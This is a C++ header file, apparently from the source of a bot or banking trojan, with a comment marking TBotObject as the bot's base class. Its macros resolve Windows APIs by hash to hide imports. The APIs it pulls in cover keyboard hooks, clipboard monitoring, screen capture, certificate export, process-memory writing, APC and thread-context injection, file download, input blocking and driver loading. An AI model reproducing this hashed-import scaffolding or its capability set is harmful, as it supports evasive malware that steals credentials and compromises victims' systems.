#define pGetTopWindow				pushargEx< DLL_USER32, 0xC90E0C33>
#define pMoveWindow					pushargEx< DLL_USER32, 0x7234A16F>
#define pFindWindowExA				pushargEx< DLL_USER32, 0xAD4FFCD5>
#define pGetMessageA				pushargEx< DLL_USER32, 0xC8A274AC>
#define pSendMessageTimeoutW		pushargEx< DLL_USER32, 0x65846C69>
#define pSendMessageTimeoutA 		pushargEx< DLL_USER32, 0x65846C7F>
#define pSetClipboardViewer			pushargEx< DLL_USER32, 0x322391FC>
#define pIsClipboardFormatAvailable	pushargEx< DLL_USER32, 0xB161BF96>
#define pChangeClipboardChain   	pushargEx< DLL_USER32, 0x7CF84417>
#define pPostMessageA				pushargEx< DLL_USER32, 0xC8A87EA7>
#define pGetMessagePos 				pushargEx< DLL_USER32, 0x9D2F45DB>
#define pClientToScreen 			pushargEx< DLL_USER32, 0x543DF505>
#define pGetWindowRect  			pushargEx< DLL_USER32, 0x97F85FA0>
#define pDefWindowProcA 			pushargEx< DLL_USER32, 0xC6CE9B8A>
#define pCallWindowProcA 			pushargEx< DLL_USER32, 0xEE5FDA87>
#define pGetKeyNameTextW 			pushargEx< DLL_USER32, 0xAD34F519>
#define pGetKeyboardState			pushargEx< DLL_USER32, 0xF5E780A6>
#define pGetKeyboardLayout			pushargEx< DLL_USER32, 0xA0C69BF7>
#define pToUnicodeEx    			pushargEx< DLL_USER32, 0x2944D0D1>
#define pLoadCursorW    			pushargEx< DLL_USER32, 0xCFB2E5CF>
#define pLoadCursorA    			pushargEx< DLL_USER32, 0xCFB2E5D9>
#define pRegisterClassA    			pushargEx< DLL_USER32, 0xAEABC9A4>
#define pCreateWindowExA   			pushargEx< DLL_USER32, 0xBF7EFB5A>
#define pTranslateMessage   		pushargEx< DLL_USER32, 0xC45D9631>
#define pDispatchMessageA   		pushargEx< DLL_USER32, 0x4BAED1C8>
#define pGetWindowDC   				pushargEx< DLL_USER32, 0xB95254C7>
#define pReleaseDC					pushargEx< DLL_USER32, 0x4CB2D16D>
#define pFillRect					pushargEx< DLL_USER32, 0xCAD4D692>
#define pCallWindowProcA		   	pushargEx< DLL_USER32, 0xEE5FDA87>
#define pCallWindowProcW			pushargEx< DLL_USER32, 0xEE5FDA91>
#define pSetTimer       			pushargEx< DLL_USER32, 0x4D9CE557>
#define pDestroyWindow      		pushargEx< DLL_USER32, 0xEB4A6DB3>
#define pGetFocus           		pushargEx< DLL_USER32, 0x6D776D57>
#define pCharLowerBuffA        		pushargEx< DLL_USER32, 0x5FDA1871>
#define pCharUpperBuffA        		pushargEx< DLL_USER32, 0xC0D4187D>
#define pwvsprintfA 				pushargEx< DLL_USER32, 0x6B3AF0EC>
#define pSetWindowsHookExA 			pushargEx< DLL_USER32, 0xB4584DDA>
#define pSetWindowsHookExW 			pushargEx< DLL_USER32, 0xB4584DCC>
#define pUnhookWindowsHookEx 		pushargEx< DLL_USER32, 0xB800C8A6>
#define pSetWindowTextA 			pushargEx< DLL_USER32, 0x3C29100A>
#define pSetWindowTextW 			pushargEx< DLL_USER32, 0x3C29101C>
#define pSetWindowLongPtrA			pushargEx< DLL_USER32, 0x334A94D2>
#define pSetWindowLongPtrW			pushargEx< DLL_USER32, 0x334A94C4>
#define pScreenToClient				pushargEx< DLL_USER32, 0xBDAE901A>
#define pGetClientRect				pushargEx< DLL_USER32, 0xA2F65BA2>
#define pGetDlgItem					pushargEx< DLL_USER32, 0x9CD421A8>
#define pCallNextHookEx				pushargEx< DLL_USER32, 0x8616AB9B>
#define pGetCursor					pushargEx< DLL_USER32, 0x199725ED>
#define pSetCursor					pushargEx< DLL_USER32, 0xD9725ED>
#define pGetAncestor			 	pushargEx< DLL_USER32, 0xAAFE9D1E>
#define pRegisterWindowMessageA	 	pushargEx< DLL_USER32, 0xE5D2B59>
#define pFindWindowA	        	pushargEx< DLL_USER32, 0x252B53B>
#define pGetDC			        	pushargEx< DLL_USER32, 0x7CBD2247>
#define pGetClassLongA	        	pushargEx< DLL_USER32, 0x2544C17C>
#define pPrintWindow	        	pushargEx< DLL_USER32, 0xF404F170>
#define pGetWindowPlacement	       	pushargEx< DLL_USER32, 0xE06982CE>
#define pIsIconic			       	pushargEx< DLL_USER32, 0x3D687AAD>
#define pSetFocus			       	pushargEx< DLL_USER32, 0x6D5F6D57>
#define pSetActiveWindow			pushargEx< DLL_USER32, 0xDB7C98FC>
#define pSetCursorPos				pushargEx< DLL_USER32, 0xBDB58517>
#define pAttachThreadInput			pushargEx< DLL_USER32, 0xE16B4137>
#define pUpdateWindow				pushargEx< DLL_USER32, 0xFC3A1D7B>
#define pDestroyMenu				pushargEx< DLL_USER32, 0x6A50AD38>
#define pmouse_event				pushargEx< DLL_USER32, 0xAB3EFAFD>
#define pSetCapture					pushargEx< DLL_USER32, 0xEB747643>
#define pReleaseCapture				pushargEx< DLL_USER32, 0x6B0BEF18>
#define pBlockInput					pushargEx< DLL_USER32, 0xF103B589>

//winsock
#define pWSACleanup 				pushargEx< DLL_WINSOCK, 0x8FB8B5BD>
#define pWSAStartup 				pushargEx< DLL_WINSOCK, 0xCDDE757D>
#define psocket 					pushargEx< DLL_WINSOCK, 0xFC7AF16A>
#define pclosesocket 				pushargEx< DLL_WINSOCK, 0x939D7D9C>
#define paccept 					pushargEx< DLL_WINSOCK, 0x3C797B7A>
#define pbind 						pushargEx< DLL_WINSOCK, 0xC5A7764>
#define phtons 						pushargEx< DLL_WINSOCK, 0x8E9BF775>
#define plisten 					pushargEx< DLL_WINSOCK, 0x9E7D3188>
#define precv 						pushargEx< DLL_WINSOCK, 0xE5971F6>
#define psend 						pushargEx< DLL_WINSOCK, 0xE797764>
#define pconnect 					pushargEx< DLL_WINSOCK, 0xEDD8FE8A>
#define pshutdown 					pushargEx< DLL_WINSOCK, 0x4C7C5841>
#define pgethostbyname 				pushargEx< DLL_WINSOCK, 0xF44318C6>
#define pgethostbyaddr 				pushargEx< DLL_WINSOCK, 0xF5A25C51>
#define pinet_addr 					pushargEx< DLL_WINSOCK, 0x95E4A5D7>
#define pinet_ntoa 					pushargEx< DLL_WINSOCK, 0x9400A044>
#define pgetaddrinfo				pushargEx< DLL_WINSOCK, 0xD9F839BA>
#define pgetpeername				pushargEx< DLL_WINSOCK, 0xD939F838>
#define pselect						pushargEx< DLL_WINSOCK, 0x5D99726A>
#define psetsockopt					pushargEx< DLL_WINSOCK, 0xD8923733>
#define pWSAGetLastError			pushargEx< DLL_WINSOCK, 0x8E878072>
#define pWSASetLastError			pushargEx< DLL_WINSOCK, 0x8E850072>
#define pioctlsocket		     	pushargEx< DLL_WINSOCK, 0x1F935B1D>
#define pWSAFDIsSet   		     	pushargEx< DLL_WINSOCK, 0x4DFC1F3B>

//ntdll
#define pRtlInitUnicodeString 		pushargEx< DLL_NTDLL, 0x3287EC73>
#define pRtlInitAnsiString			pushargEx< DLL_NTDLL, 0xEE02056A>
#define pNtOpenFile 				pushargEx< DLL_NTDLL, 0x9C45B56C>
#define pNtOpenDirectoryObject 		pushargEx< DLL_NTDLL, 0xF5F11CF0>
#define pNtCreateSection 			pushargEx< DLL_NTDLL, 0x6E6F608B>
#define pNtOpenSection 				pushargEx< DLL_NTDLL, 0x5FA9AB38>
#define pZwLoadDriver 				pushargEx< DLL_NTDLL, 0x42F57D33>
#define pZwUnloadDriver 			pushargEx< DLL_NTDLL, 0x95849B61>
#define pRtlAdjustPrivilege 		pushargEx< DLL_NTDLL, 0xC2A6B1AE>
#define pZwMakeTemporaryObject 		pushargEx< DLL_NTDLL, 0x128CE9D3>
#define pNtClose 					pushargEx< DLL_NTDLL, 0x3D9AC241>
#define pRtlImageNtHeader			pushargEx< DLL_NTDLL, 0xDD39FD14>
#define pZwQuerySystemInformation	pushargEx< DLL_NTDLL, 0xBC44A131>
#define pZwUnmapViewOfSection		pushargEx< DLL_NTDLL, 0x9ED4D161>
#define pZwMapViewOfSection			pushargEx< DLL_NTDLL, 0x594D9A3C>
#define pZwQueueApcThread			pushargEx< DLL_NTDLL, 0xC0E4F6EE>
#define pZwResumeThread				pushargEx< DLL_NTDLL, 0xACF8BF39>
#define pZwTestAlert				pushargEx< DLL_NTDLL, 0xC952A06B>
#define pZwQueryInformationThread	pushargEx< DLL_NTDLL, 0xFAEDF3AA>
#define pZwOpenProcess				pushargEx< DLL_NTDLL, 0x9C0AC99D>
#define pZwOpenProcessToken			pushargEx< DLL_NTDLL, 0xADACBE07>
#define pZwClose					pushargEx< DLL_NTDLL, 0x3D9A9259>
#define pZwAllocateVirtualMemory	pushargEx< DLL_NTDLL, 0x594AA9E4>
#define pZwFreeVirtualMemory		pushargEx< DLL_NTDLL, 0xBED3922C>
#define pZwWriteVirtualMemory		pushargEx< DLL_NTDLL, 0xEEE7AF23>
#define pZwProtectVirtualMemory		pushargEx< DLL_NTDLL, 0x3836C63E>
#define pRtlCreateUserThread		pushargEx< DLL_NTDLL, 0xE9E0A4F7>
#define pLdrLoadDll					pushargEx< DLL_NTDLL, 0x78740534>
#define pLdrGetDllHandle			pushargEx< DLL_NTDLL, 0x7E287C6A>
#define pLdrGetProcedureAddress		pushargEx< DLL_NTDLL, 0x323C2875>
#define pZwSetContextThread			pushargEx< DLL_NTDLL, 0x62E2FE6F>
#define pZwSetInformationProcess	pushargEx< DLL_NTDLL, 0xCA2BF652>
#define pZwQueryInformationProcess	pushargEx< DLL_NTDLL, 0xA638CE5F>
#define pRtlImageDirectoryEntryToData pushargEx< DLL_NTDLL, 0x503f7b28>
#define pZwQueryInformationFile		pushargEx< DLL_NTDLL, 0x0f7ba4b7>
#define pZwShutdownSystem			pushargEx< DLL_NTDLL, 0x6F1C809E>



//winsta
#define pWinStationTerminateProcess	pushargEx< DLL_WINSTA, 0xA60C5F05>

//shell32
#define pSHGetSpecialFolderPathA 	pushargEx< DLL_SHELL32, 0xC95D8550>
#define pSHGetSpecialFolderPathW 	pushargEx< DLL_SHELL32, 0xC95D8546>
#define pFindExecutableA			pushargEx< DLL_SHELL32, 0x37707500>
#define pFindExecutableW			pushargEx< DLL_SHELL32, 0x37707516>
#define pSHGetFolderPathA			pushargEx< DLL_SHELL32, 0xDEAA9541>
#define pSHGetFolderPathW			pushargEx< DLL_SHELL32, 0xDEAA9557>
#define pShellExecuteW				pushargEx< DLL_SHELL32, 0x570BC88F>
#define pShellExecuteA				pushargEx< DLL_SHELL32, 0x570BC899>
#define pStrStrIW 					pushargEx< DLL_SHELL32, 0x3E3B7742> //	PTSTR StrStrI(PTSTR pszFirst,PCTSTR pszSrch);
#define pStrStrIA 					pushargEx< DLL_SHELL32, 0x3E3B7754>
#define pShellExecuteExA			pushargEx< DLL_SHELL32, 0xf2276983>
#define pShellExecuteExW			pushargEx< DLL_SHELL32, 0xf2276995>
#define pSHFileOperationA			pushargEx< DLL_SHELL32, 0x8B6D020B>
#define pSHFileOperationW			pushargEx< DLL_SHELL32, 0x8B6D021D>



//wininet
#define pInternetConnectA 			pushargEx< DLL_WININET, 0xBE618D3E>
#define pInternetConnectW 			pushargEx< DLL_WININET, 0xBE618D28>
#define pHttpOpenRequestA 			pushargEx< DLL_WININET, 0x1510002F>
#define pHttpOpenRequestW 			pushargEx< DLL_WININET, 0x15100039>
#define pHttpSendRequestA 			pushargEx< DLL_WININET, 0x9F13856A>
#define pHttpSendRequestW 			pushargEx< DLL_WININET, 0x9F13857C>
#define pInternetCloseHandle 		pushargEx< DLL_WININET, 0x7314FB0C>
#define pInternetQueryOptionA 		pushargEx< DLL_WININET, 0x2AE71934>
#define pInternetQueryOptionW 		pushargEx< DLL_WININET, 0x2AE71922>
#define pInternetSetOptionA 		pushargEx< DLL_WININET, 0x1AD09C78>
#define pInternetSetStatusCallback 	pushargEx< DLL_WININET, 0x9EF6461>
#define pHttpQueryInfoA 			pushargEx< DLL_WININET, 0x2F5CE027>
#define pHttpQueryInfoW 			pushargEx< DLL_WININET, 0x2F5CE031>
#define pHttpAddRequestHeadersA		pushargEx< DLL_WININET, 0xB5901061>
#define pHttpAddRequestHeadersW		pushargEx< DLL_WININET, 0xB5901077>
#define pGetUrlCacheEntryInfoW 		pushargEx< DLL_WININET, 0x57FBC0CB>
#define pGetUrlCacheEntryInfoA 		pushargEx< DLL_WININET, 0x57FBC0DD>
#define pFindFirstUrlCacheEntryA	pushargEx< DLL_WININET, 0xDDCB15D>
#define pFindNextUrlCacheEntryA		pushargEx< DLL_WININET, 0x8733D614>
#define pDeleteUrlCacheEntry		pushargEx< DLL_WININET, 0xA3A80AB6>
#define pFindCloseUrlCache			pushargEx< DLL_WININET, 0xFDE87743>
#define pInternetOpenA				pushargEx< DLL_WININET, 0x8593DD7>
#define pInternetOpenUrlA			pushargEx< DLL_WININET, 0xB87DBD66>
#define pInternetReadFile			pushargEx< DLL_WININET, 0x1A212962>
#define pInternetReadFileExA		pushargEx< DLL_WININET, 0x2C523864>
#define pInternetReadFileExW		pushargEx< DLL_WININET, 0x2C523872>
#define pReadUrlCacheEntryStream	pushargEx< DLL_WININET, 0x1672BC16>
#define pUnlockUrlCacheEntryStream	pushargEx< DLL_WININET, 0xEE22C82A>
#define pRetrieveUrlCacheEntryStreamA	pushargEx< DLL_WININET, 0x609C6936>
#define pFindFirstUrlCacheEntryExA  pushargEx< DLL_WININET, 0x2C567F36>
#define pFindNextUrlCacheEntryExA	pushargEx< DLL_WININET, 0xF5841D8D>
#define pDeleteUrlCacheEntryA		pushargEx< DLL_WININET, 0xD4055B10>
#define pCreateUrlCacheEntryA		pushargEx< DLL_WININET, 0x10815BF5>
#define pCommitUrlCacheEntryA		pushargEx< DLL_WININET, 0x548D61B6>


//urlmon
#define pURLDownloadToFileA			pushargEx< DLL_URLMON, 0xD95D2399>
#define pURLDownloadToFileW			pushargEx< DLL_URLMON, 0xD95D238F>
#define pObtainUserAgentString		pushargEx< DLL_URLMON, 0x534D481>


/* gdi32.dll */
#define pCreateCompatibleBitmap		  pushargEx< DLL_GDI, 0x6B3470D5>
#define pCreateCompatibleDC		      pushargEx< DLL_GDI, 0x5AF0017C>
#define pSelectObject       	      pushargEx< DLL_GDI, 0x4894DAFC>
#define pBitBlt             	      pushargEx< DLL_GDI, 0x9E90B462>
#define pDeleteDC            	      pushargEx< DLL_GDI, 0x5E10F525>
#define pDeleteObject           	  pushargEx< DLL_GDI, 0x48B87EFC>
#define pGetDeviceCaps           	  pushargEx< DLL_GDI, 0x39E9624F>
#define pCreateSolidBrush             pushargEx< DLL_GDI, 0xEF9AC06E>


/* gdiplus.dll */
#define pGdiplusStartup		          pushargEx< DLL_GDIPLUS, 0x55F74962>
#define pGdipCreateBitmapFromHBITMAP  pushargEx< DLL_GDIPLUS, 0xB7F0B572>
#define pGdipSaveImageToFile		  pushargEx< DLL_GDIPLUS, 0xE410B3EB>
#define pGdipDisposeImage	          pushargEx< DLL_GDIPLUS, 0x226FA923>
#define pGdiplusShutdown		      pushargEx< DLL_GDIPLUS, 0x99A24264>


//crypt32
#define pCertOpenSystemStoreA				pushargEx< DLL_CRYPT32, 0xEEA9ED9D>
#define pCertEnumCertificatesInStore		pushargEx< DLL_CRYPT32, 0x9897E094>
#define pPFXExportCertStoreEx				pushargEx< DLL_CRYPT32, 0xDFDB467E>
#define pCertCloseStore						pushargEx< DLL_CRYPT32, 0xCC1A6B6B>
#define pPFXImportCertStore					pushargEx< DLL_CRYPT32, 0x3A1B7F5D>
#define pCertAddCertificateContextToStore	pushargEx< DLL_CRYPT32, 0xDC6DD6E5>
#define pCertDuplicateCertificateContext	pushargEx< DLL_CRYPT32, 0x2F16F47>
#define pCertDeleteCertificateFromStore		pushargEx< DLL_CRYPT32, 0x5B08B5F>



//
//psapi.dll
#define	pGetMappedFileNameA			pushargEx< DLL_PSAPI, 0x860331a8>
#define pEnumProcessModules			pushargEx< DLL_PSAPI, 0x189F16C9>
#define pGetModuleBaseNameA			pushargEx< DLL_PSAPI, 0x7353EFE8>
#define pGetModuleFileNameExA		pushargEx< DLL_PSAPI, 0xE4FB2191>






//
//shlwapi.dll 
#define	pPathFindFileNameA			pushargEx< DLL_SHLWAPI, 0xeed5398c>
#define pPathCombineA				pushargEx< DLL_SHLWAPI, 0x45B615D5>
#define pStrStrA					pushargEx< DLL_SHLWAPI, 0x2A7C76E6>
#define pPathRemoveFileSpecA		pushargEx< DLL_SHLWAPI, 0xE6E3EE01>
#define pStrToIntA					pushargEx< DLL_SHLWAPI, 0xAAD270E7>
#define pStrToInt64ExA				pushargEx< DLL_SHLWAPI, 0xC3C5B48>
#define pPathAppendA				pushargEx< DLL_SHLWAPI, 0xF86AA1F6>
#define pPathAppendW				pushargEx< DLL_SHLWAPI, 0xF86AA1E0>


//Iphlpapi.dll
#define	pGetIpNetTable				pushargEx< DLL_IPHLPAPI, 0xB8D99CE4>
#define	pGetAdaptersInfo			pushargEx< DLL_IPHLPAPI, 0xE69A1CD7>



//odbc32
#define pSQLAllocHandle				pushargEx< DLL_ODBC32, 0xEC1F2857>
#define pSQLSetEnvAttr				pushargEx< DLL_ODBC32, 0x88EE1E2C>
#define pSQLConnectA				pushargEx< DLL_ODBC32, 0x203F51DF>
#define pSQLDriverConnectA			pushargEx< DLL_ODBC32, 0x3941DBB7>
#define pSQLPrepareA				pushargEx< DLL_ODBC32, 0xC09D6D06>
#define pSQLBindCol					pushargEx< DLL_ODBC32, 0x3D09FC8B>
#define pSQLExecute					pushargEx< DLL_ODBC32, 0x8DE46D8A>
#define pSQLFetch					pushargEx< DLL_ODBC32, 0x6C1A778C>
#define pSQLCloseCursor				pushargEx< DLL_ODBC32, 0xACA2F119>
#define pSQLFreeHandle				pushargEx< DLL_ODBC32, 0x6A289300>
#define pSQLDisconnect				pushargEx< DLL_ODBC32, 0x8104CDA8>

//version.dll
#define pGetFileVersionInfoSizeA	pushargEx< DLL_VERSION, 0x8A94F707>
#define pGetFileVersionInfoA		pushargEx< DLL_VERSION, 0x7AA45C7A>
#define pVerQueryValueA				pushargEx< DLL_VERSION, 0x4E26C00F>



//****************************************************************
//  Вспомогательные функции
//****************************************************************

#define Min(a,b) (((a) < (b)) ? (a) : (b))
#define Max(a,b) (((a) > (b)) ? (a) : (b))


//****************************************************************
//  TBotClass - базовый класс бота
//****************************************************************


class TBotObject
{
public:
	virtual ~TBotObject() {}

	void* operator new(size_t size);
	void* operator new[](size_t size);
	void  operator delete(void* Pointer);
	void  operator delete[](void* Pointer);
};


//----------------------------------------------------------------------------
#endif
